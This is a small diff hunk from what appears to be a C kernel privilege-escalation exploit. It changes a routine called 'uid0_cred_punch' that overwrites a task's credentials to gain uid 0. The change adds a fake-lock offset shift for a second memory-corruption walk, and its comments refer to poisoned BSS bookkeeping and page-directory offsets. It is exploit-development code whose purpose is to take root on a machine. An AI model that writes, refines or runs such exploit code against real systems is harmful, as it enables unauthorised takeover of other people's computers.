@@ -2597,7 +2597,12 @@ uid0_cred_punch:;
     fflush(stdout);
     if (alive) {
       g_uid0_slot_idx = 0;
+      /* Rotate the fake lock for walk 2: stage-1's dequeue poisoned
+       * bss_tail's bookkeeping (waiters count); +0x100 stays in the
+       * zeroed BSS and clear of init_pg_dir at +0x300. */
+      g_cred2_lock_shift = 0x100;
       uid0_one_store(use_task + 0x780, "child_cred_2nd");
+      g_cred2_lock_shift = 0;
       /* fresh DISARM for the second ghost */
       if (!env_flag("UID0_NO_DISARM", 0)) {
         int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
